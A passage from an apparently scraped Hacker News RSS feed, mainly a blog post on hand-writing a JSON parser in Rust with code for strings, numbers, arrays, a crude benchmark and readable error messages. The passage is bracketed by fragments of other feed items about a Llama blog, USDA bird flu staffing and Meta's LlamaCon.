<p><img src="https://saurabhalone.com/blogs/llama3/images/train.png" alt="Llama architecture">
    <img src="https://saurabhalone.com/blogs/llama3/images/train.png" alt="Llama architecture">
</p>
  




               




<hr>
<div>
    <h3>Thank you for reading this far !! </h3>
    <h3>You can support me :</h3>
    <div>
        <ul>
            <li><a href="https://x.com/saurabhalonee">Twitter</a></li>
            <li><a href="https://buymeacoffee.com/saurabhaloq">Buy-me-Coffe</a></li>
            <li><a href="https://github.com/saurabhaloneai">Github</a></li>
        </ul>
    </div>
</div>












    



</div></article>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[USDA fired officials working on bird flu, now trying to rehire them (177 pts)]]></title>
            <link>https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716</link>
            <guid>43097709</guid>
            <pubDate>Wed, 19 Feb 2025 02:04:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716">https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716</a>, See on <a href="https://news.ycombinator.com/item?id=43097709">Hacker News</a></p>
Couldn't get https://www.nbcnews.com/politics/doge/usda-accidentally-fired-officials-bird-flu-rehire-rcna192716: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Parsing JSON in 500 lines of Rust (111 pts)]]></title>
            <link>https://www.krish.gg/blog/json-parser-in-rust</link>
            <guid>43096975</guid>
            <pubDate>Wed, 19 Feb 2025 00:25:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.krish.gg/blog/json-parser-in-rust">https://www.krish.gg/blog/json-parser-in-rust</a>, See on <a href="https://news.ycombinator.com/item?id=43096975">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Last semester at university, I took a course called "Syntax-Based Tools and Compilers". It focused on building a scanner, parser, compiler, and so on for a language called <a href="https://en.wikipedia.org/wiki/PL/0">PL0</a>. We used Python in the course, but I was really interested in learning Rust at the time.</p>
<p>So, I decided to embark on a side project (yes, another one!). This time, I wanted to build a JSON parser in Rust. My goal was to test the skills I gained in the course and finally dive into a Rust project, something I'd been putting off for three years.</p>
<h2 id="the-plan">The Plan</h2>
<p>I find that there is no better way to learn programming than to just start building. So that was my plan. I found the <a href="https://www.json.org/json-en.html">JSON specification</a> and started reading. This spec has some really nice diagrams that help visualize the structure of a JSON document.</p>
<p>There are many ways to create a "parser". I could validate, scan, tokenize, and then finally parse the JSON. But I wanted to keep it simple, so I ingored everything and just focused on "parsing" the JSON from a raw text file/string into a Rust enum that represents the JSON structure.</p>
<p>There are tools that can take grammars and autogenerate top-down or bottom-up parsers, but my implementation is something that is considered a <strong>hand-written parser</strong>. It's a flexible method that is not bound to very strict rules or implemenation details, allowing me to make changes easily.</p>
<h2 id="the-implementation">The Implementation</h2>
<h3 id="how-do-we-represent-json-in-rust">How do we represent JSON in Rust?</h3>
<p>To store this parsed JSON, I need some way to represent the data in Rust.</p>
<p>I started by creating the general enum <code>JSONValue</code> that would represenet the "tree" structure of the JSON document. Each "node" can be of many types - string, number, object, array, boolean, or null. At the root, you have one node that is the JSON object.</p>
<p>I ended up with the following enum:</p>
<pre><code><span><span>#[derive(Debug, Clone, PartialEq)]</span>
</span><span><span>enum</span> <span>JSONValue</span> <span>{</span>
</span><span>    <span>Null</span><span>,</span>
</span><span>    <span>True</span><span>,</span>
</span><span>    <span>False</span><span>,</span>
</span><span>    <span>Number</span><span>(</span><span>f64</span><span>)</span><span>,</span>
</span><span>    <span>String</span><span>(</span><span>String</span><span>)</span><span>,</span>
</span><span>    <span>Array</span><span>(</span><span>Vec</span><span>&lt;</span><span>JSONValue</span><span>&gt;</span><span>)</span><span>,</span>
</span><span>    <span>Object</span><span>(</span><span>HashMap</span><span>&lt;</span><span>String</span><span>,</span> <span>JSONValue</span><span>&gt;</span><span>)</span><span>,</span>
</span><span><span>}</span>
</span></code></pre>
<h3 id="what-about-errors">What about errors?</h3>
<p>Another thing to note is that parsing is a process that can fail - the source text may have syntax errors and the parser should be able to handle them. So, I decided to return a <code>Result</code> type from the parser. If the parsing is successful, it will return the parsed JSON value. If not, it will return an error.</p>
<pre><code><span><span>enum</span> <span>JSONParseError</span> <span>{</span>
</span><span>    <span>Error</span><span>(</span><span>usize</span><span>)</span><span>,</span>
</span><span>    <span>NotFound</span><span>,</span>
</span><span>    <span>UnexpectedChar</span><span>(</span><span>usize</span><span>)</span><span>,</span>
</span><span>    <span>MissingClosing</span><span>(</span><span>usize</span><span>)</span><span>,</span>
</span><span><span>}</span>
</span></code></pre>
<p>I used this enum to represent different types of errors that can occur during parsing. Note that some of these errors have an associated <code>usize</code> value; this value is the remaining length of the input string when the error occurred. This lets me know how much of the input string was consumed before the error happened, so I can print better error messages. The <code>NotFound</code> error is more of an internal error that I used to indicate that the parser couldn't find the expected element in the input string.</p>
<h3 id="the-json-value">The JSON "value"</h3>
<p>As per the JSON spec, everything starts as an element - which is a value surrounded by whitespace. This value can be of the following types:</p>
<ul>
<li>object</li>
<li>array</li>
<li>string</li>
<li>number</li>
<li>"true"</li>
<li>"false"</li>
<li>"null"</li>
</ul>
<h4 id="simple-values">Simple Values</h4>
<p>I wanted to start with the simplest values first, and then build up to the more complex ones. So, I started with the <code>null</code> value. A simple function for that looks like this:</p>
<pre><code><span><span>fn</span> <span>null</span><span>(</span>src<span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(</span><span>&amp;</span><span>str</span><span>,</span> <span>JSONValue</span><span>)</span><span>,</span> <span>JSONParseError</span><span>&gt;</span> <span>{</span>
</span><span>    <span>match</span> src<span>.</span><span>strip_prefix</span><span>(</span><span>"null"</span><span>)</span> <span>{</span>
</span><span>        <span>Some</span><span>(</span>rest<span>)</span> <span>=&gt;</span> <span>Ok</span><span>(</span><span>(</span>rest<span>,</span> <span>JSONValue</span><span>::</span><span>Null</span><span>)</span><span>)</span><span>,</span>
</span><span>        <span>None</span> <span>=&gt;</span> <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span><span>,</span>
</span><span>    <span>}</span>
</span><span><span>}</span>
</span></code></pre>
<p>In this code, we simply check if the input string starts with "null". If it does, we return the remaining string and the <code>JSONValue::Null</code>. If not, we return an error indicating that the expected value was not found.</p>
<p>I followed a similar approach for the <code>true</code> and <code>false</code> values; just replace "null" with "true" or "false".</p>
<h4 id="strings">Strings</h4>
<p>Parsing strings in a string of JSON sounds simple - just find the opening and closing quotes and return the string in between. But it's not that simple. Strings can contain escape sequences like <code>\"</code>, <code>\\</code>, <code>\n</code>, and so on. So there is careful handling required to parse strings correctly.</p>
<p>To parse a string, the code starts by looking for the opening quotation <code>"</code>. After finding it, it reads characters until it finds the closing quotation <code>"</code>. However, you can escape the closing quotation, so the parser maintains a flag to check if the last character was an escape character <code>\</code>. If it was, the parser handles the next character differently, making sure we don't stop parsing prematurely.</p>
<p>This is part of the code that parses strings:</p>
<pre><code><span><span>fn</span> <span>string</span><span>(</span><span>mut</span> src<span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(</span><span>&amp;</span><span>str</span><span>,</span> <span>JSONValue</span><span>)</span><span>,</span> <span>JSONParseError</span><span>&gt;</span> <span>{</span>
</span><span>    <span>// make sure we start with a quote</span>
</span><span>    <span>match</span> src<span>.</span><span>strip_prefix</span><span>(</span><span>"\""</span><span>)</span> <span>{</span>
</span><span>        <span>Some</span><span>(</span>rest<span>)</span> <span>=&gt;</span> src <span>=</span> rest<span>,</span>
</span><span>        <span>None</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span><span>,</span>
</span><span>    <span>}</span><span>;</span>
</span><span>
</span><span>    <span>let</span> <span>mut</span> result<span>:</span> <span>String</span> <span>=</span> <span>""</span><span>.</span><span>to_string</span><span>(</span><span>)</span><span>;</span>
</span><span>    <span>let</span> <span>mut</span> escaping <span>=</span> <span>false</span><span>;</span> <span>// the flag</span>
</span><span>    <span>let</span> <span>mut</span> chars <span>=</span> src<span>.</span><span>chars</span><span>(</span><span>)</span><span>;</span> <span>// iterator</span>
</span><span>
</span><span>    <span>loop</span> <span>{</span>
</span><span>        <span>let</span> c <span>=</span> <span>match</span> chars<span>.</span><span>next</span><span>(</span><span>)</span> <span>{</span>
</span><span>            <span>Some</span><span>(</span>c<span>)</span> <span>=&gt;</span> c<span>,</span>
</span><span>            <span>None</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>
</span><span>                <span>JSONParseError</span><span>::</span><span>MissingClosing</span><span>(</span>src<span>.</span><span>len</span><span>(</span><span>)</span><span>)</span>
</span><span>            <span>)</span><span>,</span>
</span><span>        <span>}</span><span>;</span>
</span><span>
</span><span>        <span>// if we have the \, then we are escaping</span>
</span><span>        <span>if</span> c <span>==</span> <span>'\\'</span> <span>&amp;&amp;</span> <span>!</span>escaping <span>{</span>
</span><span>            escaping <span>=</span> <span>true</span><span>;</span>
</span><span>        <span>}</span>
</span><span>        <span>// non-escaping closing quote</span>
</span><span>        <span>else</span> <span>if</span> c <span>==</span> <span>'"'</span> <span>&amp;&amp;</span> <span>!</span>escaping <span>{</span>
</span><span>            <span>break</span><span>;</span>
</span><span>        <span>}</span> <span>else</span> <span>if</span> escaping <span>{</span>
</span><span>            <span>// special escape sequences</span>
</span><span>            <span>match</span> c <span>{</span>
</span><span>                <span>// quotation mark</span>
</span><span>                <span>'"'</span> <span>=&gt;</span> result<span>.</span><span>push</span><span>(</span><span>'"'</span><span>)</span><span>,</span>
</span><span>                <span>...</span> <span>// other escape sequences</span>
</span><span>                _ <span>=&gt;</span> <span>{</span>
</span><span>                    <span>// can't escape whatever this is</span>
</span><span>                    <span>return</span> <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>UnexpectedChar</span><span>(</span>
</span><span>                        chars<span>.</span><span>count</span><span>(</span><span>)</span>
</span><span>                    <span>)</span><span>)</span><span>;</span>
</span><span>                <span>}</span>
</span><span>            <span>}</span>
</span><span>            escaping <span>=</span> <span>false</span><span>;</span>
</span><span>        <span>}</span> <span>else</span> <span>{</span>
</span><span>            result<span>.</span><span>push</span><span>(</span>c<span>)</span><span>;</span>
</span><span>        <span>}</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>Ok</span><span>(</span><span>(</span>chars<span>.</span><span>as_str</span><span>(</span><span>)</span><span>,</span> <span>JSONValue</span><span>::</span><span>String</span><span>(</span>result<span>)</span><span>)</span><span>)</span>
</span><span><span>}</span>
</span></code></pre>
<h4 id="numbers">Numbers</h4>
<p>In normal programming languages, we often have multiple data types to represent numbers, such as integers of different sizes, floating-point numbers, etc. In JSON, there is only one type of number - an arbitary value that can either be an integer, floating-point number, or a number in scientific notation.</p>
<p>For my parser, each number is represented as a <code>f64</code> (floating-point number). This is a simple way to represent numbers in Rust, but it does not support the full arbitrary precision that JSON allows. This is a limitation of my parser, but it's one that I'm willing to accept for now.</p>
<!-- json_number.png -->
<p><a href="https://www.krish.gg/assets/json-parser-in-rust/json_number.png"><img src="https://www.krish.gg/assets/json-parser-in-rust/json_number.png" alt="Number"></a></p>
<p>A number in JSON is made up of many parts: the integer, the fraction, and the exponent. The parser reads these parts and constructs a <code>f64</code> from them. There are also some edge cases to consider, like leading zeros, negative numbers, and so on.</p>
<p>I won't go into the full implementation here, but I have functions to parse each of those 3 parts, and I combine them to parse the full number.</p>
<pre><code><span>
</span><span><span>fn</span> <span>number</span><span>(</span><span>mut</span> src<span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(</span><span>&amp;</span><span>str</span><span>,</span> <span>JSONValue</span><span>)</span><span>,</span> <span>JSONParseError</span><span>&gt;</span> <span>{</span>
</span><span>    <span>let</span> <span>mut</span> result<span>;</span>
</span><span>    <span>let</span> negative<span>;</span>
</span><span>
</span><span>    <span>match</span> <span>integer</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span><span>(</span>rest<span>,</span> num<span>)</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>            result <span>=</span> num<span>.</span><span>abs</span><span>(</span><span>)</span> <span>as</span> <span>f64</span><span>;</span>
</span><span>            negative <span>=</span> num<span>.</span><span>is_negative</span><span>(</span><span>)</span><span>;</span>
</span><span>            src <span>=</span> rest<span>;</span>
</span><span>        <span>}</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>
</span><span>    <span>}</span><span>;</span>
</span><span>
</span><span>    <span>match</span> <span>fraction</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span><span>(</span>rest<span>,</span> frac<span>)</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>            result <span>+=</span> frac<span>;</span>
</span><span>            src <span>=</span> rest<span>;</span>
</span><span>        <span>}</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>match</span> <span>exponent</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span><span>(</span>rest<span>,</span> exponent<span>)</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>            src <span>=</span> rest<span>;</span>
</span><span>
</span><span>            <span>let</span> multipier <span>=</span> <span>10_f64</span><span>.</span><span>powf</span><span>(</span>exponent <span>as</span> <span>f64</span><span>)</span><span>;</span>
</span><span>            result <span>*=</span> multipier<span>;</span>
</span><span>        <span>}</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>if</span> negative <span>{</span>
</span><span>        result <span>*=</span> <span>-</span><span>1.0</span><span>;</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>Ok</span><span>(</span><span>(</span>src<span>,</span> <span>JSONValue</span><span>::</span><span>Number</span><span>(</span>result<span>)</span><span>)</span><span>)</span>
</span><span><span>}</span>
</span></code></pre>
<h4 id="lists-objects">Lists, Objects</h4>
<p>Both arrays and objects are collections of values. Arrays are ordered lists of values, while objects are unordered collections of key-value pairs. The parser needs to handle both of these types.</p>
<p>If looking at each of these syntactically, each of these is a collection with elements seperated by commas. For each of these, the parser needs to be able to handle 3 different cases:</p>
<ul>
<li>no elements</li>
<li>one element</li>
<li>multiple elements</li>
</ul>
<p>The case of no elements is simple - just find a pair of brackets with whitespace in between.</p>
<p>For the other two cases, we can enter a loop that keeps reading elements as long as the element has a comma after it. This is a simple way to parse these collections. It is still important to note that we cannot skip over elements that are not valid JSON values, so appropriate error handling is required.</p>
<p>Here is what the code for handling the last two cases looks like:</p>
<pre><code><span><span>fn</span> <span>elements</span><span>(</span><span>mut</span> src<span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(</span><span>&amp;</span><span>str</span><span>,</span> <span>Vec</span><span>&lt;</span><span>JSONValue</span><span>&gt;</span><span>)</span><span>,</span> <span>JSONParseError</span><span>&gt;</span> <span>{</span>
</span><span>    <span>let</span> <span>mut</span> values <span>=</span> <span>vec!</span><span>[</span><span>]</span><span>;</span>
</span><span>
</span><span>    <span>loop</span> <span>{</span>
</span><span>        <span>match</span> <span>element</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>            <span>Ok</span><span>(</span><span>(</span>rest<span>,</span> v<span>)</span><span>)</span> <span>=&gt;</span> <span>{</span>
</span><span>                src <span>=</span> rest<span>;</span>
</span><span>                values<span>.</span><span>push</span><span>(</span>v<span>)</span><span>;</span>
</span><span>            <span>}</span>
</span><span>            <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>
</span><span>        <span>}</span>
</span><span>
</span><span>        <span>// now we wanna consume the first character of src</span>
</span><span>        <span>// if it is a comma, or break otherwise</span>
</span><span>        <span>if</span> src<span>.</span><span>chars</span><span>(</span><span>)</span><span>.</span><span>next</span><span>(</span><span>)</span> <span>==</span> <span>Some</span><span>(</span><span>','</span><span>)</span> <span>{</span>
</span><span>            src <span>=</span> <span>&amp;</span>src<span>[</span><span>1</span><span>..</span><span>]</span><span>;</span>
</span><span>        <span>}</span> <span>else</span> <span>{</span>
</span><span>            <span>break</span><span>;</span>
</span><span>        <span>}</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>Ok</span><span>(</span><span>(</span>src<span>,</span> values<span>)</span><span>)</span>
</span><span><span>}</span>
</span></code></pre>
<p>Again, this isn't the full implementation, but it gives you an idea of how the parser handles these collections.</p>
<h3 id="putting-the-parser-together">Putting the parser together</h3>
<p>After building all these pieces, we now come to the root of the parser. When we see JSON used in APIs, it's often used for passing objects around. However, the root JSON object can actually be any of the types we've discussed - a string, number, object, array, boolean, or null.</p>
<p>So, the parser starts by checking which of these types the root JSON value is, and then calls the appropriate function to parse it. This happens in a specific order, as per the JSON spec.</p>
<pre><code><span><span>// the surrounding whitespace has</span>
</span><span><span>// already been stripped</span>
</span><span>
</span><span><span>fn</span> <span>value</span><span>(</span>src<span>:</span> <span>&amp;</span><span>str</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>(</span><span>&amp;</span><span>str</span><span>,</span> <span>JSONValue</span><span>)</span><span>,</span> <span>JSONParseError</span><span>&gt;</span> <span>{</span>
</span><span>    <span>match</span> <span>object</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>return</span> <span>Ok</span><span>(</span>res<span>)</span><span>,</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span> <span>// if not found, that ok</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>match</span> <span>array</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>return</span> <span>Ok</span><span>(</span>res<span>)</span><span>,</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span> <span>// if not found, that ok</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>            <span>// if any other error, propogate it up</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>match</span> <span>string</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>return</span> <span>Ok</span><span>(</span>res<span>)</span><span>,</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span> <span>// if not found, that ok</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>            <span>// if any other error, propogate it up</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>match</span> <span>number</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>return</span> <span>Ok</span><span>(</span>res<span>)</span><span>,</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span> <span>// if not found, that ok</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>            <span>// if any other error, propogate it up</span>
</span><span>    <span>}</span>
</span><span>
</span><span>    <span>match</span> <span>bool</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>return</span> <span>Ok</span><span>(</span>res<span>)</span><span>,</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span> <span>// if not found, that ok</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>            <span>// if any other error, propogate it up</span>
</span><span>    <span>}</span><span>;</span>
</span><span>
</span><span>    <span>match</span> <span>null</span><span>(</span>src<span>)</span> <span>{</span>
</span><span>        <span>Ok</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>return</span> <span>Ok</span><span>(</span>res<span>)</span><span>,</span>
</span><span>        <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span> <span>// if not found, that ok</span>
</span><span>        <span>Err</span><span>(</span>e<span>)</span> <span>=&gt;</span> <span>return</span> <span>Err</span><span>(</span>e<span>)</span><span>,</span>            <span>// if any other error, propogate it up</span>
</span><span>    <span>}</span><span>;</span>
</span><span>
</span><span>    <span>Err</span><span>(</span><span>JSONParseError</span><span>::</span><span>NotFound</span><span>)</span>
</span><span><span>}</span>
</span></code></pre>
<p>This is just a simple flow - just try to parse the root JSON value as each of the types in order. If one of them succeeds, return the result. If none of them succeed, return an error.</p>
<p>With this, the parser is complete. It can parse a JSON string into a Rust <code>JSONValue</code> enum in just 500 lines of code. Here's a gist of just this implementation: <a href="https://gist.github.com/Krish120003/369a892ba7189d3b91b91845e60a1ffa">https://gist.github.com/Krish120003/369a892ba7189d3b91b91845e60a1ffa</a></p>
<h2 id="testing-and-performance">Testing and Performance</h2>
<p>I wrote a few unit tests to make sure the parser works as expected. There are a common set of benchmark files for JSON parsers available <a href="https://github.com/serde-rs/json-benchmark/tree/master/data">here</a>. I used the <code>canada.json</code> and <code>twitter.json</code> files to test the parser. The parser was able to parse these files correctly, so I was happy with the results. The code for testing exceeds the 500 lines, so I didn't include it in the gist.</p>
<p>For performance testing, I found a nice graph on the <a href="https://github.com/ibireme/yyjson">yyjson github</a> that details JSON reader speeds for different JSON parsers. On <code>canada.json</code>, all the parsers achieve a speed under 1 GB/s. My parser was not at all optimized for performance, so I didn't expect it to be fast. Still, I decided to run a very crude benchmark to see how it compared to other parsers.</p>
<pre><code><span><span>let</span> big_file <span>=</span> <span>std<span>::</span>fs<span>::</span></span><span>read_to_string</span><span>(</span><span>"canada.json"</span><span>)</span><span>.</span><span>expect</span><span>(</span><span>"Could not read file"</span><span>)</span><span>;</span>
</span><span>
</span><span><span>// how many bytes of data?</span>
</span><span><span>let</span> num_bytes <span>=</span> big_file<span>.</span><span>len</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span><span>let</span> mul <span>=</span> <span>1000</span><span>;</span>
</span><span><span>let</span> bytes_to_parse <span>=</span> num_bytes <span>*</span> mul<span>;</span>
</span><span>
</span><span><span>let</span> start_time <span>=</span> <span>std<span>::</span>time<span>::</span></span><span>Instant</span><span>::</span><span>now</span><span>(</span><span>)</span><span>;</span>
</span><span><span>for</span> _ <span>in</span> <span>0</span><span>..</span>mul <span>{</span>
</span><span>    <span>let</span> _ <span>=</span> <span>parse</span><span>(</span>big_file<span>.</span><span>as_str</span><span>(</span><span>)</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span><span><span>let</span> end_time <span>=</span> <span>std<span>::</span>time<span>::</span></span><span>Instant</span><span>::</span><span>now</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span><span>let</span> bps <span>=</span> bytes_to_parse <span>as</span> <span>f64</span> <span>/</span> <span>(</span>end_time <span>-</span> start_time<span>)</span><span>.</span><span>as_secs_f64</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span><span>let</span> mbs <span>=</span> <span>(</span>bytes_to_parse <span>as</span> <span>f64</span><span>)</span> <span>/</span> <span>(</span><span>1_000_000.0</span><span>)</span><span>;</span>
</span><span><span>let</span> mbps <span>=</span> mbs <span>/</span> <span>(</span>end_time <span>-</span> start_time<span>)</span><span>.</span><span>as_secs_f64</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span><span>let</span> gbs <span>=</span> <span>(</span>bytes_to_parse <span>as</span> <span>f64</span><span>)</span> <span>/</span> <span>(</span><span>1_000_000_000.0</span><span>)</span><span>;</span>
</span><span><span>let</span> gbps <span>=</span> gbs <span>/</span> <span>(</span>end_time <span>-</span> start_time<span>)</span><span>.</span><span>as_secs_f64</span><span>(</span><span>)</span><span>;</span>
</span><span>
</span><span><span>println!</span><span>(</span><span>"Parsing speed: {:.2} Bytes/s"</span><span>,</span> bps<span>)</span><span>;</span>
</span><span><span>println!</span><span>(</span><span>"Parsing speed: {:.2} MB/s"</span><span>,</span> mbps<span>)</span><span>;</span>
</span><span><span>println!</span><span>(</span><span>"Parsing speed: {:.2} GB/s"</span><span>,</span> gbps<span>)</span><span>;</span>
</span></code></pre>
<p>I ran the parser on the <code>canada.json</code> file and compared it to the other parsers. With this crude benchmark, my parser was able to parse the file at a speed of around:</p>
<pre><code><span>Parsing speed: 52014622.29 Bytes/s
</span><span>Parsing speed: 52.01 MB/s
</span><span>Parsing speed: 0.05 GB/
</span></code></pre>
<p>This is not a good speed. But it's still fast enough to parse a large JSON file in under a second. I'm happy with the results, considering I didn't optimize for performance at all. Maybe some day I'll come back and try to make it faster.</p>
<h2 id="pretty-errors">Pretty Errors</h2>
<p>Finally, I wanted to make the error messages more readable. Right now, the errors are just enums with a number associated with them. I wanted to make them more human-readable, kind of like Python errors; I wanted to know which specific location in the input string caused the error, and I wanted to print surrounding context to help "debug" the issue.</p>
<p>So, after a bit of tinkering, I was able to use the <code>usize</code> values associated with the errors to print out the error message with the surrounding context. This made it much easier to debug issues with the parser.</p>
<p>The approach behind this was to use the size of the leftover source at the time of the error to compute the line number and column number of the error. This was then used to print out the error message with the surrounding context. I also added a pretty arrow to point to the exact location of the error.</p>
<pre><code><span><span>Error</span><span>:</span> <span>UnexpectedChar</span><span>(</span><span>76</span><span>)</span>
</span><span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span><span>-</span>
</span><span>  <span>"age"</span><span>:</span> <span>30</span><span>,</span>
</span><span>  <span>"cars"</span><span>:</span> <span>[</span><span>"Ford \e This has an invalid escape"</span><span>,</span> <span>"BMW"</span><span>,</span> <span>"Fiat"</span><span>]</span><span>,</span>
</span><span>                   <span>^</span>
</span><span>                   <span>|</span>
</span><span>                   <span>|</span>
</span><span><span>Error</span><span>:</span> <span>Unexpected</span> <span>Character</span> on <span>Line</span> <span>4</span> <span>Char</span> <span>19</span>
</span></code></pre>
<p>This is a nice way to show the error, and it helped me debug the parser when I was testing it.</p>
<h2 id="confusions">Confusions</h2>
<p>I understand most of what is happening in the parser, but I am very confused by a certain phenomenon. When I run the parser on <code>twitter.json</code> by doing <code>cargo run --release</code>, the parser runs at about 60 MB/s.</p>
<p>But when I run the parser on <code>twitter.json</code> by doing <code>sudo cargo run --release</code>, the parser runs at about 100+ MB/s. I have no idea why this is happening. Using sudo is significantly increasing the speed for my parser. If you have any idea, please let me know.</p>
<blockquote><p lang="en" dir="ltr">someone needs to explain this to me <a href="https://t.co/IPTEbCM50C">pic.twitter.com/IPTEbCM50C</a></p>— Krish (@n0tkr1sh) <a href="https://twitter.com/n0tkr1sh/status/1794786108225827309?ref_src=twsrc%5Etfw">May 26, 2024</a></blockquote> 
<h2 id="the-end">The End</h2>
<p>This was a fun project to work on. I learned a lot about Rust, parsers, and JSON. I also learned how to write a parser from scratch, which was a great experience. I'm happy with the results, and I'm glad I finally sat down to learn Rust.</p>
<p>The final code is about 800 lines, with all the tests, the benchmark, and the pretty error messages. You can find the full code on my GitHub: <a href="https://github.com/Krish120003/jsonparser/">https://github.com/Krish120003/jsonparser/</a>.</p>
<p>The JSON spec I used is available at <a href="https://www.json.org/json-en.html">https://www.json.org/json-en.html</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta announces LlamaCon, its first generative AI dev conference on April 29 (117 pts)]]></title>
            <link>https://www.meta.com/blog/connect-2025-llamacon-save-the-date/</link>
            <guid>43096922</guid>
